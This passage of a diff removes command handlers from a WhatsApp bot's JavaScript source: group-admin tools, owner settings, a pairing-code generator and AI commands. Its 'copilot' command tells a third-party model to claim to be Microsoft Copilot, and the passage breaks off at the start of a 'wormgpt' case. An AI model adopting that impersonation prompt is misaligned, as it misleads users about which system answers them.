-    caption: `╔══════════════════════════╗\n║  🖼️  *PROFILE PICTURE*\n╚══════════════════════════╝\n\n  └ 👤 *User* › ${label}`
-}, { quoted: m })
-} catch(e) {
-reply(`❌ *Failed to fetch profile picture.*
-_${e.message || 'User may have privacy restrictions.'}_`)
-}
-} break
-
-case 'setpp': {
-    await X.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-if (!m.quoted || !/image/.test(m.quoted.mimetype || '')) return reply(`╔══════════════════════════╗\n║  🖼️  *SET BOT PROFILE PIC*\n╚══════════════════════════╝\n\n  └ Reply to an image with *${prefix}setpp*\n  _Image will be set as the bot profile picture._`)
-try {
-let imgBuf = await m.quoted.download()
-if (!imgBuf || imgBuf.length < 100) throw new Error('Failed to download image')
-await X.updateProfilePicture(X.user.id, imgBuf)
-reply(`╔══════════════════════════╗\n║  🖼️  *PROFILE PIC UPDATED*\n╚══════════════════════════╝\n\n  ✅ Bot profile picture updated successfully.\n  _Changes may take a moment to appear._`)
-} catch(e) {
-let errMsg = (e?.message || '').toLowerCase()
-if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply(mess.botAdmin)
-else reply(`❌ *Failed to update profile picture.*
-_${e.message || 'Unknown error'}_`)
-}
-} break
-
-case 'clearsession': {
-    await X.sendMessage(m.chat, { react: { text: '🗑️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-try {
-const sessPath = path.join(__dirname, 'sessions')
-if (fs.existsSync(sessPath)) {
-let files = fs.readdirSync(sessPath).filter(f => f !== 'creds.json' && !f.includes('creds'))
-let count = 0
-for (let f of files) { try { fs.unlinkSync(path.join(sessPath, f)); count++ } catch {} }
-reply(`✅ *${count} session files* cleared.`)
-} else reply('No sessions directory found.')
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'cleartmp': {
-    await X.sendMessage(m.chat, { react: { text: '🗑️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-try {
-const tmpPath = path.join(__dirname, 'tmp')
-if (fs.existsSync(tmpPath)) {
-let files = fs.readdirSync(tmpPath)
-for (let f of files) { try { fs.unlinkSync(path.join(tmpPath, f)) } catch {} }
-reply(`✅ *${files.length} temp files* cleared.`)
-} else reply('No tmp directory found.')
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'sudo': {
-    await X.sendMessage(m.chat, { react: { text: '👑', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let sudoNum = (args[0] || '').replace(/[^0-9]/g, '')
-if (!sudoNum) return reply(`*Sudo Users:* ${global.owner.join(', ')}\n\nUsage:\n${prefix}sudo add [number]\n${prefix}sudo remove [number]`)
-let sudoAction = args[0]?.toLowerCase()
-if (sudoAction === 'add' && args[1]) {
-let num = args[1].replace(/[^0-9]/g, '')
-if (!global.owner.includes(num)) { global.owner.push(num); reply(`✅ *${num}* added as sudo user.`) }
-else reply('Already a sudo user.')
-} else if (sudoAction === 'remove' || sudoAction === 'del') {
-let num = (args[1] || '').replace(/[^0-9]/g, '')
-if (num === global._protectedOwner) return reply('Cannot remove the primary owner.')
-global.owner = global.owner.filter(o => o !== num)
-reply(`✅ *${num}* removed from sudo users.`)
-} else reply(`Usage: ${prefix}sudo add/remove [number]`)
-} break
-
-case 'setowner': {
-    await X.sendMessage(m.chat, { react: { text: '👑', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let newOwner = (args[0] || '').replace(/[^0-9]/g, '')
-if (!newOwner) return reply(`*Current Owner Number:* ${global.ownerNumber}\nUsage: ${prefix}setowner [number]`)
-global.ownerNumber = newOwner
-if (!global.owner.includes(newOwner)) global.owner.push(newOwner)
-reply(`✅ *Owner updated* › ${newOwner}`)
-} break
-
-case 'setmenu': {
-    await X.sendMessage(m.chat, { react: { text: '🎨', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-reply('*Menu Categories:*\nai, tools, owner, group, downloader, search, sticker, games, other, fun, anime, textmaker, imgedit, github, converter\n\nUse .menu [category] to view specific menus.')
-} break
-
-case 'menuimage': {
-    await X.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-if (m.quoted && /image/.test(m.quoted.mimetype || '')) {
-try {
-let media = await X.downloadAndSaveMediaMessage(m.quoted, 'menu_thumb')
-global.menuThumb = media
-reply('*Menu image updated!*')
-} catch(e) { reply('Error: ' + e.message) }
-} else if (args[0]) {
-global.menuThumb = args[0]
-reply(`✅ *Menu image URL set.*`)
-} else reply(`Reply to an image or provide URL: ${prefix}menuimage [url]`)
-} break
-
-case 'configimage': {
-    await X.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-reply(`*Image Config:*\nMenu Thumb: ${global.menuThumb || global.thumb}\nBot Pic: ${global.botPic || 'Default'}\n\nUse ${prefix}menuimage to change menu image\nUse ${prefix}botpic to change bot picture`)
-} break
-
-case 'mode': {
-    await X.sendMessage(m.chat, { react: { text: '⚙️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let modeArg = (args[0] || '').toLowerCase()
-if (modeArg === 'public') {
-    X.public = true
-    reply(`*⚡ Bot Mode: PUBLIC*\n\n✅ Everyone can use bot commands.\nAll users have access to the bot.`)
-} else if (modeArg === 'private' || modeArg === 'self') {
-    X.public = false
-    reply(`*🔒 Bot Mode: PRIVATE*\n\n🚫 Only the owner can use bot commands.\nOther users will be ignored.`)
-} else {
-    let currentMode = X.public !== false ? 'PUBLIC ✅' : 'PRIVATE 🔒'
-    reply(`*⚙️ Bot Mode Settings*\n\n📌 Current Mode: *${currentMode}*\n\n*Usage:*\n• ${prefix}mode public — Anyone can use the bot\n• ${prefix}mode private — Only owner can use the bot`)
-}
-} break
-
-// GROUP ADMIN COMMANDS
-case 'mute': {
-    await X.sendMessage(m.chat, { react: { text: '🔇', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-if (!isBotAdmins) return reply(mess.botAdmin)
-try {
-await X.groupSettingUpdate(m.chat, 'announcement')
-reply('🔇 *Group muted.* Only admins can send messages.')
-} catch(err) {
-let errMsg = (err?.message || '').toLowerCase()
-if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply(mess.botAdmin)
-else reply(mess.error)
-}
-} break
-
-case 'unmute': {
-    await X.sendMessage(m.chat, { react: { text: '🔊', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-if (!isBotAdmins) return reply(mess.botAdmin)
-try {
-await X.groupSettingUpdate(m.chat, 'not_announcement')
-reply('🔊 *Group unmuted.* Everyone can send messages.')
-} catch(err) {
-let errMsg = (err?.message || '').toLowerCase()
-if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply(mess.botAdmin)
-else reply(mess.error)
-}
-} break
-
-case 'ban': {
-    await X.sendMessage(m.chat, { react: { text: '🚫', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-let banUser = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null
-if (!banUser) return reply(`📌 *Usage:* ${prefix}ban @user`)
-let isBanOwner = owner.some(o => banUser.includes(o)) || (typeof X.areJidsSameUser === 'function' && owner.some(o => X.areJidsSameUser(banUser, o + '@s.whatsapp.net')))
-if (isBanOwner) return reply('🛡️ Cannot ban the bot owner.')
-let banUsers = loadUsers()
-if (!banUsers[banUser]) banUsers[banUser] = { name: banUser.split('@')[0], firstSeen: new Date().toISOString(), lastSeen: new Date().toISOString(), commandCount: 0, commands: {} }
-banUsers[banUser].banned = true
-saveUsers(banUsers)
-X.sendMessage(from, { text: `🚫 *@${banUser.split('@')[0]} has been banned from using the bot.*`, mentions: [banUser] }, { quoted: m })
-} break
-
-case 'unban': {
-    await X.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-let unbanUser = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null
-if (!unbanUser) return reply(`📌 *Usage:* ${prefix}unban @user`)
-let usersDb = loadUsers()
-if (usersDb[unbanUser]) { usersDb[unbanUser].banned = false; saveUsers(usersDb) }
-X.sendMessage(from, { text: `✅ *@${unbanUser.split('@')[0]} has been unbanned.*`, mentions: [unbanUser] }, { quoted: m })
-} break
-
-case 'antisocialgames':
-case 'antisgames': {
-    await X.sendMessage(m.chat, { react: { text: '🎭', key: m.key } })
-    if (!m.isGroup) return reply(mess.OnlyGrup)
-    if (!isAdmins && !isOwner) return reply(mess.admin)
-    if (!global.antiSocialGames) global.antiSocialGames = {}
-    const _asgArg = (args[0] || '').toLowerCase()
-    if (!_asgArg || _asgArg === 'status') {
-        const _on = global.antiSocialGames[m.chat] ? '✅ ON' : '❌ OFF'
-        return reply(`╔══════════════════════════╗\n║  🎭 *ANTI SOCIAL GAMES*\n╚══════════════════════════╝\n\n  ├ 📊 *Status* › *${_on}*\n\n  _When ON, blocks:_\n  ├ .vibe  ├ .rizz   ├ .iq\n  ├ .ship  ├ .simp   ├ .wasted\n  ├ .truth ├ .dare   └ .lolice\n\n  _Removed offensive aliases:_\n  ├ .gay   (now .vibe)\n  └ .horny (now .rizz)\n\n  ├ ${prefix}antisocialgames on\n  └ ${prefix}antisocialgames off`)
-    }
-    if (_asgArg === 'on') {
-        global.antiSocialGames[m.chat] = true
-        return reply(`✅ *Anti Social Games ON*\n_Social game commands are now blocked in this group._`)
-    }
-    if (_asgArg === 'off') {
-        global.antiSocialGames[m.chat] = false
-        return reply(`❌ *Anti Social Games OFF*\n_Social game commands are now allowed._`)
-    }
-}
-break
-
-case 'antibadword': {
-    await X.sendMessage(m.chat, { react: { text: '🤬', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-let abwArg = (args[0] || '').toLowerCase()
-if (abwArg === 'on') { global.antiBadword = true; reply('🛡️ *Anti Badword ON* — Bad words will be detected.') }
-else if (abwArg === 'off') { global.antiBadword = false; reply('❌ *Anti Badword OFF*') }
-else reply(`🛡️ *Anti Badword: ${global.antiBadword ? '✅ ON' : '❌ OFF'}*\n\n📌 Usage: ${prefix}antibadword on/off`)
-} break
-
-case 'antitag': {
-    await X.sendMessage(m.chat, { react: { text: '🏷️', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-let atgArg = (args[0] || '').toLowerCase()
-if (atgArg === 'on') { global.antiTag = true; reply('🛡️ *Anti Tag ON* — Mass tagging will be detected.') }
-else if (atgArg === 'off') { global.antiTag = false; reply('❌ *Anti Tag OFF*') }
-else reply(`🛡️ *Anti Tag: ${global.antiTag ? '✅ ON' : '❌ OFF'}*\n\n📌 Usage: ${prefix}antitag on/off`)
-} break
-
-case 'antisticker': {
-    await X.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-let asArg = (args[0] || '').toLowerCase()
-if (asArg === 'on') { global.antiSticker = true; reply('🛡️ *Anti Sticker ON* — Stickers will be deleted.') }
-else if (asArg === 'off') { global.antiSticker = false; reply('❌ *Anti Sticker OFF*') }
-else reply(`🛡️ *Anti Sticker: ${global.antiSticker ? '✅ ON' : '❌ OFF'}*\n\n📌 Usage: ${prefix}antisticker on/off`)
-} break
-
-case 'antidemote': {
-    await X.sendMessage(m.chat, { react: { text: '⚠️', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-let adArg2 = (args[0] || '').toLowerCase()
-if (adArg2 === 'on') { global.antiDemote = true; reply('🛡️ *Anti Demote ON* — Demoted admins will be re-promoted.') }
-else if (adArg2 === 'off') { global.antiDemote = false; reply('❌ *Anti Demote OFF*') }
-else reply(`🛡️ *Anti Demote: ${global.antiDemote ? '✅ ON' : '❌ OFF'}*\n\n📌 Usage: ${prefix}antidemote on/off`)
-} break
-
-case 'setgdesc': {
-    await X.sendMessage(m.chat, { react: { text: '📝', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-if (!isBotAdmins) return reply(mess.botAdmin)
-if (!text) return reply(`📌 *Usage:* ${prefix}setgdesc [new description]`)
-try {
-await X.groupUpdateDescription(m.chat, text)
-reply('✅ *Group description updated.*')
-} catch(err) {
-let errMsg = (err?.message || '').toLowerCase()
-if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply(mess.botAdmin)
-else reply(mess.error)
-}
-} break
-
-case 'setgname': {
-    await X.sendMessage(m.chat, { react: { text: '✏️', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-if (!isBotAdmins) return reply(mess.botAdmin)
-if (!text) return reply(`╔══════════════════════════╗\n║  ✏️  *SET GROUP NAME*\n╚══════════════════════════╝\n\n  └ *Usage:* ${prefix}setgname [new name]\n  _Example: ${prefix}setgname My Awesome Group_`)
-try {
-let oldName = groupName || 'Unknown'
-await X.groupUpdateSubject(m.chat, text)
-reply(`╔══════════════════════════╗\n║  ✏️  *GROUP NAME UPDATED*\n╚══════════════════════════╝\n\n  ├ 📛 *Old* › ${oldName}\n  └ ✅ *New* › ${text}\n\n  _Group name successfully changed._`)
-} catch(err) {
-let errMsg = (err?.message || '').toLowerCase()
-if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply(mess.botAdmin)
-else reply(`❌ *Failed to update group name.*\n_${err.message || 'Unknown error'}_`)
-}
-} break
-
-case 'setgpp': {
-    await X.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-if (!isBotAdmins) return reply(mess.botAdmin)
-if (!m.quoted || !/image/.test(m.quoted.mimetype || '')) return reply(`╔══════════════════════════╗\n║  🖼️  *SET GROUP PHOTO*\n╚══════════════════════════╝\n\n  └ Reply to an image with *${prefix}setgpp*\n  _Image will be set as group profile picture._`)
-try {
-let media = await m.quoted.download()
-await X.updateProfilePicture(m.chat, media)
-reply(`╔══════════════════════════╗\n║  🖼️  *GROUP PHOTO UPDATED*\n╚══════════════════════════╝\n\n  ✅ *${groupName || 'Group'}* profile picture updated.`)
-} catch(err) {
-let errMsg = (err?.message || '').toLowerCase()
-if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply(mess.botAdmin)
-else reply(`❌ *Failed to update group photo.*\n_${err.message || 'Unknown error'}_`)
-}
-} break
-
-case 'open': {
-    await X.sendMessage(m.chat, { react: { text: '🔓', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-if (!isBotAdmins) return reply(mess.botAdmin)
-try {
-await X.groupSettingUpdate(m.chat, 'not_announcement')
-reply('🔓 *Group opened.* Everyone can send messages.')
-} catch(err) {
-let errMsg = (err?.message || '').toLowerCase()
-if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply(mess.botAdmin)
-else reply(mess.error)
-}
-} break
-
-case 'close': {
-    await X.sendMessage(m.chat, { react: { text: '🔒', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-if (!isBotAdmins) return reply(mess.botAdmin)
-try {
-await X.groupSettingUpdate(m.chat, 'announcement')
-reply('🔐 *Group closed.* Only admins can send messages.')
-} catch(err) {
-let errMsg = (err?.message || '').toLowerCase()
-if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply(mess.botAdmin)
-else reply(mess.error)
-}
-} break
-
-case 'resetlink': {
-    await X.sendMessage(m.chat, { react: { text: '🔄', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-if (!isBotAdmins) return reply(mess.botAdmin)
-try {
-await X.groupRevokeInvite(m.chat)
-let newCode = await X.groupInviteCode(m.chat)
-reply(`╔══════════════════════════╗\n║  🔄 *GROUP LINK RESET*\n╚══════════════════════════╝\n\n  ✅ Old link revoked, new link generated.\n\n  🔗 https://chat.whatsapp.com/${newCode}\n\n  _Share to invite new members._`)
-} catch(err) {
-let errMsg = (err?.message || '').toLowerCase()
-if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply(mess.botAdmin)
-else reply(`❌ *Failed to reset group link.*\n_${err.message || 'Unknown error'}_`)
-}
-} break
-
-case 'link': {
-    await X.sendMessage(m.chat, { react: { text: '🔗', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-if (!isBotAdmins) return reply(mess.botAdmin)
-try {
-let code = await X.groupInviteCode(m.chat)
-let memberCount = participants.length
-reply(`╔══════════════════════════╗\n║  🔗 *GROUP INVITE LINK*\n╚══════════════════════════╝\n\n  ├ 🏘️  *Group*   › ${groupName || 'This Group'}\n  └ 👥 *Members* › ${memberCount}\n\n  🔗 https://chat.whatsapp.com/${code}\n\n  _Use ${prefix}resetlink to revoke & regenerate._`)
-} catch(err) {
-let errMsg = (err?.message || '').toLowerCase()
-if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply(mess.botAdmin)
-else reply(`❌ *Failed to get group link.*\n_${err.message || 'Unknown error'}_`)
-}
-} break
-
-case 'goodbye': {
-    await X.sendMessage(m.chat, { react: { text: '👋', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-let gbArg = (args[0] || '').toLowerCase()
-if (gbArg === 'on') {
-    global.welcome = true
-    reply(`╔══════════════════════════╗\n║  👋 *GOODBYE MESSAGES*\n╚══════════════════════════╝\n\n  ✅ *Enabled in ${groupName || 'this group'}*\n  _Bot will farewell departing members._`)
-} else if (gbArg === 'off') {
-    global.welcome = false
-    reply(`╔══════════════════════════╗\n║  👋 *GOODBYE MESSAGES*\n╚══════════════════════════╝\n\n  ❌ *Disabled in ${groupName || 'this group'}*\n  _Goodbye messages turned off._`)
-} else {
-    let gbState = global.welcome ? '✅ ON' : '❌ OFF'
-    reply(`╔══════════════════════════╗\n║  👋 *GOODBYE MESSAGES*\n╚══════════════════════════╝\n\n  ├ 📊 *Status* › ${gbState}\n  └ Farewells departing members\n\n  ├ ${prefix}goodbye on  — Enable\n  └ ${prefix}goodbye off — Disable`)
-}
-} break
-
-// GROUP TOOLS COMMANDS
-case 'tagall': {
-    await X.sendMessage(m.chat, { react: { text: '📢', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-let tagMsg = text || '📢 Tag All Members'
-let tagText = `*${tagMsg}*\n\n`
-let mentions = []
-for (let mem of participants) { tagText += `• @${mem.id.split('@')[0]}\n`; mentions.push(mem.id) }
-X.sendMessage(from, { text: tagText, mentions }, { quoted: m })
-} break
-
-case 'tag': {
-    await X.sendMessage(m.chat, { react: { text: '📢', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!text) return reply(`📌 *Usage:* ${prefix}tag [message]`)
-let tagMentions = participants.map(p => p.id)
-X.sendMessage(from, { text: text, mentions: tagMentions }, { quoted: m })
-} break
-
-case 'hidetag': {
-    await X.sendMessage(m.chat, { react: { text: '🏷️', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-let htText = text || ''
-let htMentions = participants.map(p => p.id)
-X.sendMessage(from, { text: htText, mentions: htMentions }, { quoted: m })
-} break
-
-case 'tagnoadmin': {
-    await X.sendMessage(m.chat, { react: { text: '📢', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-let nonAdmins = participants.filter(p => !p.admin).map(p => p.id)
-let tnaText = `📢 *${text || 'Attention non-admins!'}*\n\n`
-nonAdmins.forEach(id => tnaText += `• @${id.split('@')[0]}\n`)
-X.sendMessage(from, { text: tnaText, mentions: nonAdmins }, { quoted: m })
-} break
-
-case 'mention': {
-    await X.sendMessage(m.chat, { react: { text: '📢', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!text) return reply(`📌 *Usage:* ${prefix}mention [message]`)
-let mentionIds = participants.map(p => p.id)
-X.sendMessage(from, { text: text, mentions: mentionIds }, { quoted: m })
-} break
-
-case 'groupinfo': {
-    await X.sendMessage(m.chat, { react: { text: '📊', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-let gInfo = `*Group Info*\n\n`
-gInfo += `Name: ${groupMetadata.subject}\n`
-gInfo += `ID: ${m.chat}\n`
-gInfo += `Created: ${new Date(groupMetadata.creation * 1000).toLocaleDateString()}\n`
-gInfo += `Members: ${participants.length}\n`
-gInfo += `Admins: ${groupAdmins.length}\n`
-gInfo += `Description: ${groupMetadata.desc || 'None'}\n`
-reply(gInfo)
-} break
-
-case 'admins': {
-    await X.sendMessage(m.chat, { react: { text: '👑', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-let adminList = '*Group Admins:*\n\n'
-let adminMentions = []
-for (let p of participants) {
-if (p.admin) { adminList += `@${p.id.split('@')[0]} (${p.admin})\n`; adminMentions.push(p.id) }
-}
-X.sendMessage(from, { text: adminList, mentions: adminMentions }, { quoted: m })
-} break
-
-case 'leave': {
-    await X.sendMessage(m.chat, { react: { text: '🚪', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isOwner) return reply(mess.OnlyOwner)
-try {
-reply('*Leaving group...*')
-await delay(2000)
-await X.groupLeave(m.chat)
-} catch(err) { reply('Failed to leave: ' + err.message) }
-} break
-
-case 'pair': {
-    await X.sendMessage(m.chat, { react: { text: '💑', key: m.key } })
-if (!isDeployedNumber) return reply(mess.OnlyOwner)
-// Usage: .pair 254712345678  OR  just .pair (pairs the sender's own number)
-let pairPhone = text ? text.replace(/[^0-9]/g, '') : ''
-if (!pairPhone) {
-    return reply(`╔══════════════════════════╗\n║  🔗 *PAIRING CODE*\n╚══════════════════════════╝\n\n  └ *Usage:* ${prefix}pair [phone number]\n  _Example: ${prefix}pair 254712345678_\n  _Include country code, no + or spaces._\n\n  After receiving code:\n  ├ Open WhatsApp → Settings\n  ├ Linked Devices → Link a Device\n  └ Link with phone number → enter code`)
-}
-if (pairPhone.length < 7 || pairPhone.length > 15) {
-    return reply(`❌ *Invalid phone number.*\nMust be 7–15 digits including country code.\n\n*Example:* ${prefix}pair 254712345678`)
-}
-try {
-    await reply('🔗 _Generating pairing code, please wait..._')
-
-    // ── FIX: Use a temporary isolated socket for pairing ──────────────────
-    // Calling requestPairingCode() on the active socket (X) triggers
-    // connectionReplaced and kills the current session. Instead, we spin up
-    // a fresh, in-memory-only socket that has no saved creds, request the
-    // code from that throwaway socket, then immediately close it.
-    // The active session (X) is never touched and stays connected.
-    const { default: makeTmpSocket, useMultiFileAuthState: _umfas } = require('gifted-baileys')
-    const os = require('os'), path = require('path'), fs = require('fs')
-    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pair-tmp-'))
-    let tmpSock = null
-    try {
-        const { state: tmpState, saveCreds: _sc } = await _umfas(tmpDir)
-        tmpSock = makeTmpSocket({
-            auth: tmpState,
-            printQRInTerminal: false,
-            browser: Browsers.ubuntu('Chrome'),
-            logger: { level: 'silent', trace(){}, debug(){}, info(){}, warn(){}, error(){}, fatal(){}, child(){ return this } }
-        })
-        // Wait for WS handshake before requesting code
-        await new Promise((res, rej) => {
-            const t = setTimeout(() => rej(new Error('WS handshake timeout')), 12000)
-            tmpSock.ev.on('connection.update', (u) => {
-                if (u.connection === 'open' || u.isNewLogin !== undefined || (u.qr === undefined && tmpSock.ws?.readyState === 1)) {
-                    clearTimeout(t); res()
-                }
-                if (u.connection === 'close') { clearTimeout(t); rej(new Error('Temp socket closed before pairing')) }
-            })
-            // Also resolve once WS is open (readyState=1) after short delay
-            const poll = setInterval(() => {
-                if (tmpSock.ws?.readyState === 1) { clearInterval(poll); clearTimeout(t); setTimeout(res, 1500) }
-            }, 300)
-        }).catch(() => {}) // timeout is okay — ws may already be ready
-        await new Promise(r => setTimeout(r, 2000)) // brief settle delay
-        let code = await tmpSock.requestPairingCode(pairPhone)
-        if (!code) throw new Error('No code returned')
-        code = code.replace(/[^A-Z0-9]/gi, '').toUpperCase()
-        let formatted = code.match(/.{1,4}/g)?.join('-') || code
-        await reply(`╔══════════════════════════╗\n║  🔗 *PAIRING CODE READY!*\n╚══════════════════════════╝\n\n  ├ 📱 *Phone* › +${pairPhone}\n  └ 🔑 *Code*  › *${formatted}*\n\n  ├ Open WhatsApp → Settings\n  ├ Linked Devices → Link a Device\n  └ Enter the code above\n\n  ⏳ _Expires in a few minutes._`)
-    } finally {
-        // Always destroy the temp socket and clean up its tmp dir
-        try { tmpSock?.end() } catch(_) {}
-        try { fs.rmSync(tmpDir, { recursive: true, force: true }) } catch(_) {}
-    }
-    // ── END FIX ───────────────────────────────────────────────────────────
-} catch(e) {
-    let msg = (e.message || '').toLowerCase()
-    if (msg.includes('bad request') || msg.includes('invalid')) {
-        reply(`❌ *Invalid phone number:* +${pairPhone}\n\nMake sure the number is correct with country code.\n_Example: 254712345678_`)
-    } else if (msg.includes('rate') || msg.includes('limit')) {
-        reply(`⏳ *Rate limited.* Too many pairing requests.\nWait a few minutes and try again.`)
-    } else if (msg.includes('not supported') || msg.includes('registered')) {
-        reply(`❌ *This number is not registered on WhatsApp.*\n\nVerify the number +${pairPhone} has WhatsApp installed.`)
-    } else {
-        reply(`❌ *Failed to generate pairing code.*\n_${e.message || 'Unknown error'}_\n\nTry again in a few seconds.`)
-    }
-}
-} break
-
-case 'clear': {
-    await X.sendMessage(m.chat, { react: { text: '🗑️', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-reply('*Chat cleared.* (Note: WhatsApp does not support remote chat clearing)')
-} break
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Additional AI Commands
-case 'copilot':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🪁', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Microsoft Copilot, a helpful AI assistant. Be productive, accurate and helpful.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[COPILOT ERROR]', e.message)
-    reply('❌ copilot is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'vision':
-case 'analyse': {
-    await X.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
-if (!m.quoted || !/image/.test(m.quoted.mimetype || '')) return reply(`╔══════════════════════════╗\n║  🔍 *IMAGE ANALYSIS*\n╚══════════════════════════╝\n\n  └ Reply to an image with *${prefix}${command}*\n  _Optionally add a question after the command._`)
-try {
-let question = text || 'Describe this image in detail. Include objects, people, colors, text, and any notable elements.'
-await reply('🔍 _Analysing image, please wait..._')
-// Download image as buffer directly
-let imgBuffer = await m.quoted.download()
-if (!imgBuffer || imgBuffer.length < 100) throw new Error('Failed to download image')
-// Convert buffer to base64
-let b64 = imgBuffer.toString('base64')
-let mime = m.quoted.mimetype || 'image/jpeg'
-// Use pollinations vision API (openai-compatible with image support)
-let apiBody = {
-    model: 'openai',
-    messages: [{
-        role: 'user',
-        content: [
-            { type: 'text', text: question },
-            { type: 'image_url', image_url: { url: `data:${mime};base64,${b64}` } }
-        ]
-    }],
-    max_tokens: 1000,
-    stream: false
-}
-let response = await axios.post('https://text.pollinations.ai/openai', apiBody, {
-    headers: { 'Content-Type': 'application/json' },
-    timeout: 30000
-})
-let desc = response.data?.choices?.[0]?.message?.content
-if (!desc) throw new Error('No response from vision API')
-reply(`╔══════════════════════════╗\n║  🔍 *IMAGE ANALYSIS*\n╚══════════════════════════╝\n\n${desc}`)
-} catch(e) {
-// Fallback: upload to catbox then use URL-based vision
-try {
-let imgBuffer2 = await m.quoted.download()
-let uploadUrl = await uploadImage(imgBuffer2)
-if (!uploadUrl || !uploadUrl.startsWith('http')) throw new Error('Upload failed')
-let question2 = text || 'Describe this image in detail. Include objects, people, colors, text, and any notable elements.'
-let fb = await axios.post('https://text.pollinations.ai/openai', {
-    model: 'openai',
-    messages: [{ role: 'user', content: [
-        { type: 'text', text: question2 },
-        { type: 'image_url', image_url: { url: uploadUrl } }
-    ]}],
-    max_tokens: 1000, stream: false
-}, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-let desc2 = fb.data?.choices?.[0]?.message?.content
-if (!desc2) throw new Error('No response')
-reply(`╔══════════════════════════╗\n║  🔍 *IMAGE ANALYSIS*\n╚══════════════════════════╝\n\n${desc2}`)
-} catch(e2) {
-reply(`❌ *Vision analysis failed.*\n_${e2.message || 'Unable to analyse image. Try again shortly.'}_`)
-}
-}
-} break
-
-case 'wormgpt':{
